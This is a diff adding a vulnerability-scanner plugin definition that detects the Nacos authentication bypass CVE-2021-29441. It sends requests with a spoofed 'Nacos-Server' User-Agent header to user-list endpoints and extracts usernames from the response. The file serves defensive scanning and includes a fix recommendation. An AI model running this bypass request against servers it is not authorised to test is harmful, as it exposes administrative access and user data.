@@ -1,0 +1,87 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "CVE202129441VulnDetector"
+  author: "hh-hunter"
+  version: "0.1"
+}
+
+###########
+# FINDING #
+###########
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2021_29441"
+  }
+  severity: CRITICAL
+  title: "CVE-2021-29441 Nacos Authentication Bypass Via Backdoor"
+  description: "Nacos is a platform designed for dynamic service discovery and configuration and service management. In Nacos before version 1.4.1, when configured to use authentication (-Dnacos.core.auth.enabled=true) Nacos uses the AuthFilter servlet filter to enforce authentication. This filter has a backdoor that enables Nacos servers to bypass this filter and therefore skip authentication checks. This mechanism relies on the user-agent HTTP header so it can be easily spoofed. This issue may allow any user to carry out any administrative tasks on the Nacos server."
+  recommendation: "Configure nacos.core.auth.enabled to true, upgrade nacos to the latest version, configure custom authentication key-value pair information"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2021-29441"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "verify_nacos_auth_bypass"
+  action_phase: ACTION_PHASE_DETECTION
+  http_request: {
+    method: GET
+    uri: [
+      "/nacos/v1/auth/users?pageNo=1&pageSize=9",
+      "/nacos/v1/auth/users/?pageNo=1&pageSize=9",
+      "/v1/auth/users?pageNo=1&pageSize=9"
+    ]
+    headers: [
+      {
+        name: "User-Agent"
+        value: "Nacos-Server"
+      }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { header: { name: "Content-Type" } contains: "application/json" },
+          { body: {} contains: "\"pageItems\"" },
+          { body: {} contains: "\"totalCount\"" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            variable_name: "nacos_username"
+            regexp: "\"username\"\\s*:\\s*\"([^\"]+)\""
+            from_body: {}
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "verify_nacos_auth_bypass"
+  ]
+}
